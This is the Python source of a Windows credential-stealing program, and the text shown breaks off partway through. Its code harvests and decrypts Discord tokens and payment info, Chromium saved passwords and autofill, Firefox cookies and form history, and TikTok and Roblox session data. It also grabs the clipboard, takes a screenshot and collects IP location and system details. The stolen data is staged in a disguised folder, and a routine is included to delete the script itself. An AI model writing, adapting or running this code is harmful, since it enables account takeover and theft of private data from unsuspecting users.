debug = False

import os, re, sys, json, uuid, winreg, ctypes, base64, shutil, socket, base64, sqlite3, zipfile, platform, subprocess, ctypes.wintypes

python_alias = sys.executable

localappdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

installation_folder = f"C:\\Users\\{os.getlogin()}\\My Games"
log_file = f"{installation_folder}\\{os.getlogin()}.zip"
discord_info = f"{installation_folder}\\Discord"
chromium_info = f"{installation_folder}\\Chromium Browsers"
firefox_info = f"{installation_folder}\\Firefox"
softwares_info = f"{installation_folder}\\Softwares"
accounts_info = f"{installation_folder}\\Accounts"

os.makedirs(installation_folder, exist_ok=True)
os.makedirs(discord_info, exist_ok=True)
os.makedirs(chromium_info, exist_ok=True)
os.makedirs(firefox_info, exist_ok=True)
os.makedirs(softwares_info, exist_ok=True)
os.makedirs(accounts_info, exist_ok=True)

file_header = "\n꧁ঔৣ☬✞𝓐𝓑𝓐𝓝𝓨✞☬ঔৣ꧂\n\n"

class Sys:
    def InstallPackages(packages):
        for package in packages:
            try:
                subprocess.run([python_alias, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                subprocess.run(["pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def KillProcess(processName):
        result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if processName not in result.stdout:
            return
        subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

    def Remove(path):
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            pass

    def ExtractClipboard():
        return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()


def AddFolderToZip(zipFile, folderPath, arcBase=""):
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=folderPath)
            if arcBase:
                arcname = os.path.join(arcBase, arcname)
            zipFile.write(file_path, arcname)

def AutoDelete():
    subprocess.Popen(["cmd.exe", "/C", "ping", "localhost", "-n", "5", "&&", "del", "/F", f"\"{__file__}\""])
    sys.exit()


Sys.InstallPackages(packages=["requests", "pycryptodome", "pillow"])
import requests
from PIL import Image
from Crypto.Cipher import AES


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= DISCORD ============================================================================================================== #
total_discord_token = 0
class Discord:
    def __init__(self):
        self.discord_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.discord_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.discord_common_paths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

    @staticmethod
    def ValidateToken(token: str) -> bool:
        r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if r.status_code == 200: return True
        return False

    @staticmethod
    def DecryptVal(buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    @staticmethod
    def GetMasterKey(path: str) -> str:
        if not os.path.exists(path):
            return None
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None

        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

        pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
            decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
            ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            return decrypted_key
    
    def GetDiscordTokens(self):
        discord_tokens = []
        discord_uids = []
        for name, path in self.discord_common_paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(roaming + f'\{_discord}\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.discord_regexp_enc, line):
                            token = Discord.DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), Discord.GetMasterKey(roaming + f'\{_discord}\Local State'))

                            if Discord.ValidateToken(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.discord_regexp, line):
                            if Discord.ValidateToken(token):
                                uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                if uid not in discord_uids:
                                    discord_tokens.append(token)
                                    discord_uids.append(uid)

        return discord_tokens

    @staticmethod
    def ExtractInfosFromToken(tokens):
        final_to_return = []
        for token in tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']

            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else:
                payment_methods = None

            final_message = (f"│👤 Username: {username} ({user_id})\n"
                             f"│🔑 Token: {token}\n"
                             f"│⚡ Nitro: {nitro}\n"
                             f"│💳 Billing: {payment_methods if payment_methods != "" else "None"}\n"
                             f"│🔗 MFA: {mfa}\n"
                             f"│🌐 Email: {email if email != None else "None"}\n"
                             f"│📞 Phone: {phone if phone != None else "None"}\n")
            final_to_return.append(final_message)

        return final_to_return
    
def CheckGuilds(token):
    try:
        guilds_formatted = []
        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

        response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
        guilds_json = response.json()

        for guild in guilds_json:
            if guild["approximate_member_count"] < 1 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
                continue
            
            request = requests.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
            invites = request.json()

            invite_code = invites[0]['code'] if invites else None

            guilds_formatted.append(f"│⚔️ Guild Name: {guild['name']}\n│✉ Invite Link: {f'https://discord.gg/{invite_code}' if invite_code else 'Unavailable'}\n│🧾 Guild ID: {guild['id']}\n│👥 Members: {guild['approximate_member_count']}\n│🔑 Token: {token}\n├─────────────────────────────────────────────────────────\n")

        return guilds_formatted if guilds_formatted else "what a shit account (* ￣︿￣)"
    except Exception as e:
        return e


try:
    DiscordStealer = Discord()
    tokens_raw = DiscordStealer.GetDiscordTokens()
    tokens_formatted = DiscordStealer.ExtractInfosFromToken(tokens_raw)

    with open(f"{discord_info}\\tokens.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for token in tokens_formatted:
            writer.write(token)
            writer.write("├─────────────────────────────────────────────────────────\n")
            total_discord_token += 1
        
        writer.write("└─────────────────────────────────────────────────────────\n")

    with open(f"{discord_info}\\guilds.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for token in tokens_raw:
            guilds = CheckGuilds(token)
            for guild in guilds:
                writer.write(guild)

        writer.write("└─────────────────────────────────────────────────────────\n")


except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= COOKIES CLASS ======================================================================================================== #
class CookieInfo:
    @staticmethod
    def Tiktok(cookie):
        try:
            email = ''
            phone = ''
            cookies = "sessionid=" + cookie
            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
            headers2 = {"cookie": cookies}
            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
            
            with requests.Session() as session:
                response = session.get(url, headers=headers)
                data = response.json()

                response2 = session.get(url2, headers=headers2)
                data2 = response2.json()

            user_id = data["data"]["user_id"]
            if not data["data"]["email"]:
                email = "No Email"
            else:
                email = data["data"]["email"]
            if not data["data"]["mobile"]:
                phone = "No number"
            else:
                phone = data["data"]["mobile"]
            username = data["data"]["username"]
            coins = data2["data"]["coins"]

            with open(f"{accounts_info}\\tiktok.txt", "a", encoding="utf-8") as writer:
                writer.write(f"""│👤 Username: {username} ({user_id})
│🌐 Email: {email}
│📞 Phone: {phone}
│💎 Coins: {coins}
│📌 Profile URL: https://tiktok.com/@{username}
│🍪 Cookie: {cookie}""")
                
        except Exception as e:
            print(f"[Tiktok] {e}")

    @staticmethod
    def Roblox(cookie):
        try:
            headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
            with requests.Session() as session:
                response = session.get("https://www.roblox.com/my/account/json", headers=headers)
                res = response.json()

                user_id = str(res['UserId'])

                response2 = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
                res2 = response2.json()

                response3 = session.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false", headers=headers)
                res3 = response3.json()

                id = res["UserId"]
                name = res["Name"]
                display_name = res["DisplayName"]
                email = res["UserEmail"]
                isEmailVerified = res["IsEmailVerified"]
                robux = res2["robux"]

                with open(f"{accounts_info}\\roblox.txt", "a", encoding="utf-8") as writer:
                    writer.write(f"""│👤 Name: {display_name} ({name})
│🌐 Email: {email}
│💎 Robux: {robux}
│🍪 Cookie: {cookie}""")

        except:
            print(f"[Roblox] {e}")

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CHROMIUM ============================================================================================================= #
total_passwords = 0
total_autofills = 0
total_cookies = 0

class Chromium:
    def __init__(self):
        self.chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(localappdata, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(roaming, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(roaming, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(roaming, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
        self.chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]
    
    @staticmethod
    def DecryptData(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
                pDataOut = DATA_BLOB()

                if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                    decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                    return decrypted_data.decode()

            except Exception as e:
                return f"Failed to decrypt data: {e}"

    def ExtractPasswords(self):
        browser_passwords = []
        for browser in self.chromiumBrowsers:
            Sys.KillProcess(browser['taskname'])
            local_state_path = os.path.join(browser['path'], 'Local State')
            if not os.path.exists(local_state_path):
                continue

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            try:
                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

                pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
                pDataOut = DATA_BLOB()

                if ctypes.windll.Crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
                ):
                    decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                else:
                    raise ValueError("Failed to decrypt master key.")
            except Exception as e:
                print(f"Error decrypting master key :: {e}")
                continue

            for subpath in self.chromiumSubpaths:
                login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
                if not os.path.exists(login_data_path):
                    continue

                try:
                    temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                    shutil.copy(login_data_path, temp_db)

                    connection = sqlite3.connect(temp_db)
                    cursor = connection.cursor()
                    query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                    cursor.execute(query_passwords)

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        password = self.DecryptData(encrypted_password, decryption_key)

                        if username or password:
                            browser_passwords.append(
                                {
                                    "url": origin_url,
                                    "username": username,
                                    "password": password,
                                }
                            )

                    cursor.close()
                    connection.close()
                    os.remove(temp_db)

                except Exception as e:
                    continue

        return browser_passwords

    def ExtractAutofill(self):
        browser_autofills = []
        for browser in self.chromiumBrowsers:
            Sys.KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in self.chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]

                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill") 
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f"│👤 Name: {autofill[0]}\n"
                                    f"│🔑 Value: {autofill[1]}\n"
                                    f"├─────────────────────────────────────────────────────────\n"
                                )
                                browser_autofills.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)

        return browser_autofills


ChromiumStealer = Chromium()
try:
    passwords = ChromiumStealer.ExtractPasswords()

    formatted = "┌─────────────────────────────────────────────────────────\n"
    for entry in passwords:
        formatted += (
            f"│🌐 URL:            {entry['url']}\n"
            f"│👤 Username:       {entry['username']}\n"
            f"│🔑 Password:       {entry['password']}\n"
            f"├─────────────────────────────────────────────────────────\n")
        total_passwords += 1
    
    formatted += "└─────────────────────────────────────────────────────────"

    with open(f"{chromium_info}\\passwords.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write(formatted)

except Exception as e:
    print(e)

try:
    autofills = ChromiumStealer.ExtractAutofill()

    with open(f"{chromium_info}\\autofills.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for autofill in autofills:
            writer.write(autofill)
            total_autofills += 1

        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FIREFOX ============================================================================================================= #
class Firefox:
    def __init__(self):
        self.files_path = []

    def ListProfiles(self):
        try:
            directory = os.path.join(os.getenv('APPDATA') , "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
                            self.files_path.append(file_path)

        except Exception as e:
            print(f"[FirefoxProfile] {e}")

    def ExtractCookies(self):
        global total_cookies
        cookies_extracted = []

        try:
            for files in self.files_path:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    cookies = cursor.fetchall()

                    for cookie in cookies:
                        cookies_extracted.append(f"| {cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                        total_cookies += 1

                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                            CookieInfo.Tiktok(cookie[3])

                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            CookieInfo.Roblox()

        except Exception as e:
            print(f"[FirefoxCookies] {e}")

        return cookies_extracted

    def ExtractAutofills(self):
        global total_autofills
        autofills = []

        try:
            for files in self.files_path:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select fieldname, value from moz_formhistory")

                    autofills_raw = cursor.fetchall()
                    for entry in autofills_raw:
                        autofills.append(f"│👤 Name: {entry[0]}\n│🔑 Value: {entry[1]}\n")
                        total_autofills += 1

        except Exception as e:
            print(f"[FirefoxAutofills] {e}")

        return autofills

FirefoxStealer = Firefox()
FirefoxStealer.ListProfiles()

try:
    cookies = FirefoxStealer.ExtractCookies()

    with open(f"{firefox_info}\\cookies.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for cookie in cookies:
            writer.write(cookie)
            writer.write("├─────────────────────────────────────────────────────────\n")

        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    print(f"[FirefoxCookies] [Writer] {e}")

try:
    autofills = FirefoxStealer.ExtractAutofills()

    with open(f"{firefox_info}\\autofills.txt", "w", encoding="utf-8") as writer:
        writer.write(file_header)
        writer.write("┌─────────────────────────────────────────────────────────\n")
        for entry in autofills:
            writer.write(entry)
            writer.write("├─────────────────────────────────────────────────────────\n")

        writer.write("└─────────────────────────────────────────────────────────\n")

except Exception as e:
    print(f"[FirefoxAutofills] [Writer] {e}")


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= CLIPBOARD ============================================================================================================ #
clipboard = Sys.ExtractClipboard()
try:
    if clipboard != "":
        with open(f"{installation_folder}\\clipboard.txt", "w", encoding="utf-8") as writer:
            writer.write(file_header)
            writer.write(clipboard)
    else:
        with open(f"{installation_folder}\\clipboard.txt", "w", encoding="utf-8") as writer:
            writer.write("Empty !")

except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= FILES ================================================================================================================ #
class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

try:
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
    gdi32.SelectObject(hdc_mem, hbm)
    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
    bmp_info = BITMAPINFOHEADER()
    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmp_info.biWidth = screen_width
    bmp_info.biHeight = -screen_height
    bmp_info.biPlanes = 1
    bmp_info.biBitCount = 32
    bmp_info.biCompression = 0
    buffer_size = screen_width * screen_height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
    gdi32.DeleteObject(hbm)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)
    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
    image.save(f"{installation_folder}\\desktop.png")
except Exception as e:
    print(e)


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= INFO PC ============================================================================================================== #
requInfos = requests.get('https://ipinfo.io')
data = requInfos.json()

session = os.getlogin()
computer_name = socket.gethostname()
os_version = platform.system() + " " + platform.release()
architecture = platform.machine()
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')
cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]
ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip() ; ram = ram.replace('\u00A0', ' ')
motherboard = subprocess.run(["wmic", "baseboard", "get", "product"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip() ; motherboard = motherboard.splitlines() ; motherboard = motherboard[1].strip() if len(motherboard) > 1 else "Unkown"
disk = subprocess.run(["cmd", "/c", "wmic logicaldisk get caption,description,providername"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
startup = subprocess.run(["cmd", "/c", "wmic startup get caption,command"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
tasklist = subprocess.run(["cmd", "/c", "tasklist /svc"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
keyboard = subprocess.run(["powershell", "(Get-WinUserLanguageList)[0].InputMethodTips"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()

with open(f"{installation_folder}\\computer.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    writer.write(f"""System Summary:
   👤 Session@Computer: {session}@{computer_name}
   🖥 OS: {os_version}
   🛠 Architecture: {architecture}
   📡 MAC: {mac}
   📁 Running Path: {os.path.dirname(os.path.abspath(__file__))}
   ⌨ Keyboard: {keyboard}

Network :
   📌 IP: {ip}
   🌍 Country: {country}
   🗺 Region: {region}
   🏠 City: {city}
   🧭 Localisation: {loc}
   ⚡ Internet Provider: {org}

Hardware :
   ⚙ CPU: {cpu}
   🔋  RAM: {ram}
   🖥 Motherboard: {motherboard}

Disk :
{disk}
""")
    
with open(f"{installation_folder}\\startup.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)
    writer.write(startup)

with open(f"{installation_folder}\\tasklist.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)
    writer.write(tasklist)

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================= INSTALLED SOFTWARES ================================================================================================== #
with open(f"{softwares_info}\\installed-browsers.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    writer.write("┌─────────────────────────────────────────────────────────\n")
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as key:
            for i in range(winreg.QueryInfoKey(key)[0]):
                browser_name = winreg.EnumKey(key, i)
                
                browser_key_path = fr"SOFTWARE\Clients\StartMenuInternet\{browser_name}\shell\open\command"
                
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, browser_key_path) as command_key:
                        executable_path, _ = winreg.QueryValueEx(command_key, "")
                        writer.write(f"│ {os.path.basename(executable_path).replace("\"", "")}\n")
                except FileNotFoundError:
                    pass

                writer.write("├─────────────────────────────────────────────────────────\n")

    except Exception as e:
        pass

    writer.write("└─────────────────────────────────────────────────────────\n")

with open(f"{softwares_info}\\installed-softwares.txt", "w", encoding="utf-8") as writer:
    writer.write(file_header)

    key_paths = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]

    writer.write("┌─────────────────────────────────────────────────────────\n")
    for key_path in key_paths:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
